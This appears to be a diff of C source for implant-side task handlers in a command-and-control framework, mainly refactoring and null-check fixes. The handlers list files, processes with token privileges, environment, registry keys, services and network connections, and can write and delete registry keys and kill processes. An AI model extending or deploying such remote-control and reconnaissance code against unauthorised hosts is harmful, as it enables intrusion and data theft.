+	pResult->pData = BufferMove(pElement->pMarshaledData, pElement->cbMarshaledData);
 	pElement->pMarshaledData = NULL;
 CLEANUP:
 	FreeElement(pElement);
@@ -1004,7 +1120,7 @@ CLEANUP:
 	FREE(lpDhcpServer);
 	FREE(lpRespData);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 BOOL LsHandlerCallback
@@ -1081,7 +1197,7 @@ PENVELOPE LsHandler
 	LPSTR lpPath = NULL;
 	LPSTR lpFullPath = NULL;
 	LPWSTR lpConvertedPath = NULL;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	DWORD dwNumberOfItems = 0;
 	PFILE_INFO* FileList = NULL;
 	DWORD i = 0;
@@ -1090,6 +1206,8 @@ PENVELOPE LsHandler
 	CHAR szTimeZone[0x10];
 	TIME_ZONE_INFORMATION TimeZoneInfo;
 
+	SecureZeroMemory(LsElement, sizeof(LsElement));
+	SecureZeroMemory(FileInfoElement, sizeof(FileInfoElement));
 	pRecvElement = ALLOC(sizeof(PBElement));
 	pRecvElement->Type = Bytes;
 	pRecvElement->dwFieldIdx = 1;
@@ -1117,7 +1235,6 @@ PENVELOPE LsHandler
 		szTimeZone[0] = '-';
 	}
 
-	SecureZeroMemory(LsElement, sizeof(LsElement));
 	LsElement[0] = CreateBytesElement(lpFullPath, lstrlenA(lpFullPath), 1);
 	LsElement[1] = CreateVarIntElement(TRUE, 2);
 	if (IsFileExist(lpConvertedPath)) {
@@ -1127,7 +1244,6 @@ PENVELOPE LsHandler
 		FileList[0]->dwMaxCount = dwNumberOfItems;
 		LsHandlerCallback(lpConvertedPath, FileList);
 
-		SecureZeroMemory(&FileInfoElement, sizeof(FileInfoElement));
 		FileInfoElement[0] = CreateBytesElement(FileList[0]->lpName, lstrlenA(FileList[i]->lpName), 1);
 		FileInfoElement[1] = CreateVarIntElement(FileList[0]->IsDir, 2);
 		FileInfoElement[2] = CreateVarIntElement(FileList[0]->uFileSize, 3);
@@ -1138,7 +1254,7 @@ PENVELOPE LsHandler
 		pElementList = ALLOC(sizeof(PPBElement) * dwNumberOfItems);
 		pElementList[0] = CreateStructElement(FileInfoElement, _countof(FileInfoElement), 0);
 	}
-	else {
+	else if (IsFolderExist(lpConvertedPath)) {
 		dwNumberOfItems = GetChildItemCount(lpConvertedPath);
 		FileList = ALLOC(sizeof(PFILE_INFO) * dwNumberOfItems);
 		for (i = 0; i < dwNumberOfItems; i++) {
@@ -1146,12 +1262,11 @@ PENVELOPE LsHandler
 		}
 
 		FileList[0]->dwMaxCount = dwNumberOfItems;
-		PrintFormatW(L"lpConvertedPath: %s\n", lpConvertedPath);
 		ListFileEx(lpConvertedPath, 0, (LIST_FILE_CALLBACK)LsHandlerCallback, FileList);
 		dwNumberOfItems = FileList[0]->dwIdx;
 		pElementList = ALLOC(sizeof(PPBElement) * dwNumberOfItems);
 		for (i = 0; i < dwNumberOfItems; i++) {
-			SecureZeroMemory(&FileInfoElement, sizeof(FileInfoElement));
+			SecureZeroMemory(FileInfoElement, sizeof(FileInfoElement));
 			FileInfoElement[0] = CreateBytesElement(FileList[i]->lpName, lstrlenA(FileList[i]->lpName), 1);
 			FileInfoElement[1] = CreateVarIntElement(FileList[i]->IsDir, 2);
 			FileInfoElement[2] = CreateVarIntElement(FileList[i]->uFileSize, 3);
@@ -1163,13 +1278,16 @@ PENVELOPE LsHandler
 		}
 	}
 
-	LsElement[2] = CreateRepeatedStructElement(pElementList, dwNumberOfItems, 3);
+	if (pElementList != NULL && dwNumberOfItems > 0) {
+		LsElement[2] = CreateRepeatedStructElement(pElementList, dwNumberOfItems, 3);
+	}
+
 	LsElement[3] = CreateBytesElement(szTimeZone, lstrlenA(szTimeZone), 4);
 	LsElement[4] = CreateVarIntElement(TimeZoneInfo.Bias < 0 ? -(TimeZoneInfo.Bias * 60) : TimeZoneInfo.Bias * 60, 5);
 	pFinalElement = CreateStructElement(LsElement, _countof(LsElement), 0);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	if (UnmarshaledData != NULL) {
@@ -1192,7 +1310,7 @@ CLEANUP:
 	FreeElement(pRecvElement);
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE IcaclsHandler
@@ -1204,7 +1322,7 @@ PENVELOPE IcaclsHandler
 	PBUFFER* UnmarshaledData = NULL;
 	LPSTR lpPath = NULL;
 	LPWSTR lpTempPath = NULL;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PACL pAcl = NULL;
 	PACE_HEADER pAceHdr = NULL;
 	DWORD i = 0;
@@ -1436,9 +1554,9 @@ PENVELOPE IcaclsHandler
 	}
 
 	pFinalElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	if (UnmarshaledData != NULL) {
@@ -1453,7 +1571,7 @@ CLEANUP:
 	FreeElement(pRecvElement);
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 #define PH_NEXT_PROCESS(Process) ( \
@@ -1486,7 +1604,6 @@ PENVELOPE PsHandler
 	DWORD cbProcesses = 0;
 	HANDLE hToken = NULL;
 	DWORD i = 0;
-	DWORD j = 0;
 	DWORD dwIdx = 0;
 	LPSTR lpTempStr = NULL;
 	HANDLE hProc = NULL;
@@ -1495,7 +1612,7 @@ PENVELOPE PsHandler
 	PTOKEN_INFO pTokenInfo = NULL;
 	PTOKEN_GROUP_INFO pGroupInfo = NULL;
 	DWORD dwPrivilegeAttr = 0;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	DWORD dwTemp = 0;
 	PPBElement pReceivedElement = NULL;
 	PUINT64 pUnmarshalledPid = NULL;
@@ -1541,19 +1658,25 @@ PENVELOPE PsHandler
 		pProcessElements[12] = CreateBytesElement(lpImageName, lstrlenA(lpImageName), 13);
 
 		lpTempStr = GetProcessCommandLine(hProc);
-		pProcessElements[1] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 2);
-		FREE(lpTempStr);
+		if (lpTempStr != NULL) {
+			pProcessElements[1] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 2);
+			FREE(lpTempStr);
+		}
 
 		lpTempStr = GetProcessCurrentDirectory(hProc);
-		pProcessElements[2] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 3);
-		FREE(lpTempStr);
+		if (lpTempStr != NULL) {
+			pProcessElements[2] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 3);
+			FREE(lpTempStr);
+		}
 
 		pProcessElements[3] = CreateVarIntElement((UINT64)pProcessInfo->UniqueProcessId, 4);
 		pProcessElements[4] = CreateVarIntElement((UINT64)pBasicInfo->InheritedFromUniqueProcessId, 5);
 
 		lpTempStr = DescribeProcessMitigation(hProc);
-		pProcessElements[5] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 6);
-		FREE(lpTempStr);
+		if (lpTempStr != NULL) {
+			pProcessElements[5] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 6);
+			FREE(lpTempStr);
+		}
 
 		pImageVersion = GetImageVersion(lpImagePath);
 		if (pImageVersion != NULL) {
@@ -1600,11 +1723,6 @@ PENVELOPE PsHandler
 					pElementList = ALLOC(pTokenInfo->pPrivileges->PrivilegeCount * sizeof(PPBElement));
 					for (i = 0; i < pTokenInfo->pPrivileges->PrivilegeCount; i++) {
 						SecureZeroMemory(PrivilegeElements, sizeof(PrivilegeElements));
-						for (j = 0; j < _countof(PrivilegeElements); j++) {
-							PrivilegeElements[j] = ALLOC(sizeof(PBElement));
-							PrivilegeElements[j]->dwFieldIdx = j + 1;
-						}
-
 						dwTemp = 0x40;
 						lpTempStr = ALLOC(dwTemp);
 						LookupPrivilegeNameA(NULL, &pTokenInfo->pPrivileges->Privileges[i].Luid, lpTempStr, &dwTemp);
@@ -1637,17 +1755,26 @@ PENVELOPE PsHandler
 					pElementList = ALLOC(pTokenInfo->dwGroupCount * sizeof(PPBElement));
 					for (i = 0; i < pTokenInfo->dwGroupCount; i++) {
 						SecureZeroMemory(pTokenGroupElements, sizeof(pTokenGroupElements));
-						for (j = 0; j < 5; j++) {
-							pTokenGroupElements[j] = ALLOC(sizeof(PBElement));
-							pTokenGroupElements[j]->dwFieldIdx = j + 1;
+						pGroupInfo = &pTokenInfo->pTokenGroupsInfo[i];
+						if (pGroupInfo->lpName != NULL) {
+							pTokenGroupElements[0] = CreateBytesElement(pGroupInfo->lpName, lstrlenA(pGroupInfo->lpName), 1);
 						}
 
-						pGroupInfo = &pTokenInfo->pTokenGroupsInfo[i];
-						pTokenGroupElements[0] = CreateBytesElement(pGroupInfo->lpName, lstrlenA(pGroupInfo->lpName), 1);
-						pTokenGroupElements[1] = CreateBytesElement(pGroupInfo->lpStatus, lstrlenA(pGroupInfo->lpStatus), 2);
-						pTokenGroupElements[2] = CreateBytesElement(pGroupInfo->lpSID, lstrlenA(pGroupInfo->lpSID), 3);
-						pTokenGroupElements[3] = CreateBytesElement(pGroupInfo->lpDesc, lstrlenA(pGroupInfo->lpDesc), 4);
-						pTokenGroupElements[4] = CreateBytesElement(pGroupInfo->lpMandatoryLabel, lstrlenA(pGroupInfo->lpMandatoryLabel), 5);
+						if (pGroupInfo->lpStatus != NULL) {
+							pTokenGroupElements[1] = CreateBytesElement(pGroupInfo->lpStatus, lstrlenA(pGroupInfo->lpStatus), 2);
+						}
+
+						if (pGroupInfo->lpSID != NULL) {
+							pTokenGroupElements[2] = CreateBytesElement(pGroupInfo->lpSID, lstrlenA(pGroupInfo->lpSID), 3);
+						}
+
+						if (pGroupInfo->lpDesc != NULL) {
+							pTokenGroupElements[3] = CreateBytesElement(pGroupInfo->lpDesc, lstrlenA(pGroupInfo->lpDesc), 4);
+						}
+
+						if (pGroupInfo->lpMandatoryLabel != NULL) {
+							pTokenGroupElements[4] = CreateBytesElement(pGroupInfo->lpMandatoryLabel, lstrlenA(pGroupInfo->lpMandatoryLabel), 5);
+						}
 
 						pElementList[i] = CreateStructElement(pTokenGroupElements, _countof(pTokenGroupElements), 0);
 					}
@@ -1669,9 +1796,9 @@ PENVELOPE PsHandler
 	} while (pProcessInfo = PH_NEXT_PROCESS(pProcessInfo));
 
 	pFinalElement = CreateRepeatedStructElement(pElementList2, dwIdx, 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	FREE(pUnmarshalledPid);
@@ -1680,7 +1807,7 @@ CLEANUP:
 	FREE(pProcesses);
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE TerminateHandler
@@ -1688,7 +1815,7 @@ PENVELOPE TerminateHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PPBElement RecvElementList[2];
 	DWORD i = 0;
 	PUINT64 UnmarshaledData = NULL;
@@ -1721,9 +1848,9 @@ PENVELOPE TerminateHandler
 	}
 
 	pFinalElement = CreateVarIntElement(dwPid, 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	FREE(UnmarshaledData);
@@ -1737,7 +1864,7 @@ CLEANUP:
 
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE GetEnvHandler
@@ -1751,7 +1878,7 @@ PENVELOPE GetEnvHandler
 	PPBElement pFinalElement = NULL;
 	DWORD cElementList = 0x100;
 	PBUFFER* pTemp = NULL;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	LPWSTR lpEnvList = NULL;
 	LPSTR lpKey = NULL;
 	LPSTR lpValue = NULL;
@@ -1760,12 +1887,12 @@ PENVELOPE GetEnvHandler
 	DWORD cbValue = 0;
 	DWORD dwNeededSize = 0;
 
+	SecureZeroMemory(ElementList2, sizeof(ElementList2));
 	pElement = ALLOC(sizeof(PBElement));
 	pElement->Type = Bytes;
 	pElement->dwFieldIdx = 1;
 	
 	pElementList = ALLOC(cElementList * sizeof(PBElement));
-	SecureZeroMemory(ElementList2, sizeof(ElementList2));
 	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
 	if (pTemp == NULL) {
 		lpEnvList = GetEnvironmentStringsW();
@@ -1774,8 +1901,7 @@ PENVELOPE GetEnvHandler
 				break;
 			}
 
-			lpEnvList += lstrlenW(lpEnvList);
-			lpEnvList++;
+			lpEnvList += lstrlenW(lpEnvList) + 1;
 		}
 
 		lpTemp = lpEnvList;
@@ -1819,9 +1945,9 @@ PENVELOPE GetEnvHandler
 		FREE(lpValue);
 	}
 
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	FreeElement(pFinalElement);
@@ -1835,7 +1961,9 @@ CLEANUP:
 	}
 
 	FreeElement(pElement);
-	return pRespEnvelope;
+	FREE(pElementList);
+
+	return pResult;
 }
 
 PENVELOPE RegistryReadHandler
@@ -1843,7 +1971,7 @@ PENVELOPE RegistryReadHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PPBElement RecvElementList[3];
 	DWORD i = 0;
 	PBUFFER* UnmarshaledData = NULL;
@@ -1997,9 +2125,9 @@ PENVELOPE RegistryReadHandler
 	}
 
 	pFinalElement = CreateBytesElement(lpFormattedValue, lstrlenA(lpFormattedValue), 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	if (UnmarshaledData != NULL) {
@@ -2011,7 +2139,7 @@ CLEANUP:
 	}
 
 	for (i = 0; i < _countof(RecvElementList); i++) {
-		FreeElement(RecvElementList[i]);
+		FREE(RecvElementList[i]);
 	}
 
 	FREE(pData);
@@ -2025,7 +2153,7 @@ CLEANUP:
 	FREE(lpValueName);
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE RegistryWriteHandler
@@ -2033,7 +2161,7 @@ PENVELOPE RegistryWriteHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PPBElement RecvElementList[10];
 	DWORD i = 0;
 	LPVOID* UnmarshaledData = NULL;
@@ -2157,9 +2285,9 @@ PENVELOPE RegistryWriteHandler
 	}
 
 	pFinalElement = CreateStructElement(NULL, 0, 9);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	if (UnmarshaledData != NULL) {
@@ -2167,13 +2295,11 @@ CLEANUP:
 			if (RecvElementList[i]->Type != Varint) {
 				FreeBuffer(UnmarshaledData[i]);
 			}
+
+			FREE(RecvElementList[i]);
 		}
 
 		FREE(UnmarshaledData);
-	}
-
-	for (i = 0; i < _countof(RecvElementList); i++) {
-		FreeElement(RecvElementList[i]);
 	}
 
 	if (hKey != NULL) {
@@ -2186,7 +2312,7 @@ CLEANUP:
 	FREE(pValue);
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE RegistryCreateKeyHandler
@@ -2194,7 +2320,7 @@ PENVELOPE RegistryCreateKeyHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PPBElement RecvElementList[3];
 	DWORD i = 0;
 	PBUFFER* UnmarshaledData = NULL;
@@ -2257,9 +2383,9 @@ PENVELOPE RegistryCreateKeyHandler
 	}
 	
 	pFinalElement = CreateStructElement(NULL, 0, 9);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	if (UnmarshaledData != NULL) {
@@ -2284,7 +2410,7 @@ CLEANUP:
 	FREE(lpTemp);
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE RegistryDeleteKeyHandler
@@ -2292,7 +2418,7 @@ PENVELOPE RegistryDeleteKeyHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PPBElement RecvElementList[3];
 	DWORD i = 0;
 	PBUFFER* UnmarshaledData = NULL;
@@ -2382,9 +2508,9 @@ PENVELOPE RegistryDeleteKeyHandler
 	}
 
 	pFinalElement = CreateStructElement(NULL, 0, 9);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	if (UnmarshaledData != NULL) {
@@ -2410,7 +2536,7 @@ CLEANUP:
 	FREE(lpTemp);
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE RegistrySubKeysListHandler
@@ -2418,7 +2544,7 @@ PENVELOPE RegistrySubKeysListHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PPBElement RecvElementList[2];
 	PBUFFER* pSubKeys = NULL;
 	DWORD i = 0;
@@ -2508,21 +2634,18 @@ PENVELOPE RegistrySubKeysListHandler
 	}
 
 	pFinalElement = CreateRepeatedBytesElement(pSubKeys, i, 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	if (UnmarshaledData != NULL) {
 		for (i = 0; i < _countof(RecvElementList); i++) {
 			FreeBuffer(UnmarshaledData[i]);
+			FREE(RecvElementList[i]);
 		}
 
 		FREE(UnmarshaledData);
-	}
-
-	for (i = 0; i < _countof(RecvElementList); i++) {
-		FreeElement(RecvElementList[i]);
 	}
 
 	if (hKey != NULL) {
@@ -2541,7 +2664,7 @@ CLEANUP:
 
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE RegistryListValuesHandler
@@ -2549,7 +2672,7 @@ PENVELOPE RegistryListValuesHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PPBElement RecvElementList[2];
 	PBUFFER* pValues = NULL;
 	DWORD i = 0;
@@ -2639,9 +2762,9 @@ PENVELOPE RegistryListValuesHandler
 	}
 
 	pFinalElement = CreateRepeatedBytesElement(pValues, i, 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	if (UnmarshaledData != NULL) {
@@ -2672,7 +2795,7 @@ CLEANUP:
 
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE ServicesHandler
@@ -2680,7 +2803,7 @@ PENVELOPE ServicesHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	LPENUM_SERVICE_STATUS_PROCESSA Services = NULL;
 	LPENUM_SERVICE_STATUS_PROCESSA pService = NULL;
 	PPBElement ServiceDetails[7];
@@ -2689,11 +2812,13 @@ PENVELOPE ServicesHandler
 	DWORD dwNumberOfServices = 0;
 	SC_HANDLE hService = NULL;
 	DWORD i = 0;
+	DWORD j = 0;
 	SC_HANDLE hScManager = NULL;
 	LPQUERY_SERVICE_CONFIGA pServiceConfig = NULL;
 	DWORD dwBytesNeeded = 0;
 	LPSERVICE_DESCRIPTIONA lpServiceDesc = NULL;
 
+	SecureZeroMemory(ServiceDetails, sizeof(ServiceDetails));
 	Services = EnumServices(&dwNumberOfServices);
 	if (Services == NULL || dwNumberOfServices == 0) {
 		goto CLEANUP;
@@ -2710,6 +2835,12 @@ PENVELOPE ServicesHandler
 		pService = &Services[i];
 		SecureZeroMemory(ServiceDetails, sizeof(ServiceDetails));
 		ServiceDetails[0] = CreateBytesElement(pService->lpServiceName, lstrlenA(pService->lpServiceName), 1);
+		for (j = 0; j < lstrlenA(pService->lpDisplayName); j++) {
+			if ((UCHAR)pService->lpDisplayName[j] >= 0x7f) {
+				pService->lpDisplayName[j] = '*';
+			}
+		}
+
 		ServiceDetails[1] = CreateBytesElement(pService->lpDisplayName, lstrlenA(pService->lpDisplayName), 2);
 		ServiceDetails[3] = CreateVarIntElement(pService->ServiceStatusProcess.dwCurrentState, 4);
 		hService = OpenServiceA(hScManager, pService->lpServiceName, SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS);
@@ -2743,9 +2874,9 @@ PENVELOPE ServicesHandler
 	}
 
 	pFinalElement = CreateRepeatedStructElement(ServiceList, dwNumberOfServices, 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 
 CLEANUP:
@@ -2757,7 +2888,7 @@ CLEANUP:
 	FREE(ServiceList);
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE ServiceDetailHandler
@@ -2765,7 +2896,7 @@ PENVELOPE ServiceDetailHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PPBElement ServiceDetails[7];
 	PPBElement pFinalElement = NULL;
 	PBUFFER** pServiceInfoReq = NULL;
@@ -2782,6 +2913,7 @@ PENVELOPE ServiceDetailHandler
 	LPSTR lpServiceDisplayName = NULL;
 	SERVICE_STATUS ServiceStatus;
 
+	SecureZeroMemory(ServiceDetails, sizeof(ServiceDetails));
 	pRecvElement = ALLOC(sizeof(PBElement));
 	pRecvElement->Type = StructType;
 	pRecvElement->dwFieldIdx = 1;
@@ -2807,7 +2939,6 @@ PENVELOPE ServiceDetailHandler
 		goto CLEANUP;
 	}
 
-	SecureZeroMemory(ServiceDetails, sizeof(ServiceDetails));
 	ServiceDetails[0] = CreateBytesElement(lpServiceName, lstrlenA(lpServiceName), 1);
 	GetServiceDisplayNameA(hScManager, lpServiceName, NULL, &cchServiceDisplayName);
 	cchServiceDisplayName++;
@@ -2850,9 +2981,9 @@ PENVELOPE ServiceDetailHandler
 	}
 
 	pFinalElement = CreateStructElement(ServiceDetails, _countof(ServiceDetails), 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 
 CLEANUP:
@@ -2878,7 +3009,7 @@ CLEANUP:
 
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE StartServiceByNameHandler
@@ -2886,7 +3017,7 @@ PENVELOPE StartServiceByNameHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PBUFFER** pServiceInfoReq = NULL;
 	PPBElement pRecvElement;
 	SC_HANDLE hService = NULL;
@@ -2926,8 +3057,8 @@ PENVELOPE StartServiceByNameHandler
 		goto CLEANUP;
 	}
 
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
 CLEANUP:
 	if (lpServiceName != NULL) {
 		FREE(lpServiceName);
@@ -2949,7 +3080,7 @@ CLEANUP:
 		CloseServiceHandle(hService);
 	}
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE NetstatHandler
@@ -2966,7 +3097,7 @@ PENVELOPE NetstatHandler
 	DWORD i = 0;
 	DWORD dwNumberOfBytesRead = 0;
 	PUINT64 pTemp = NULL;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	DWORD dwReturnedLength = 0;
 	BOOL Tcp = FALSE;
 	BOOL Udp = FALSE;
@@ -3139,9 +3270,9 @@ PENVELOPE NetstatHandler
 	}
 
 	pFinalElement = CreateRepeatedStructElement(SockTabList, dwNumberOfConnections, 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	for (i = 0; i < _countof(RecvElementList); i++) {
@@ -3153,7 +3284,7 @@ CLEANUP:
 	FREE(SockTabList);
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE CurrentTokenOwnerHandler
@@ -3161,7 +3292,7 @@ PENVELOPE CurrentTokenOwnerHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	DWORD i = 0;
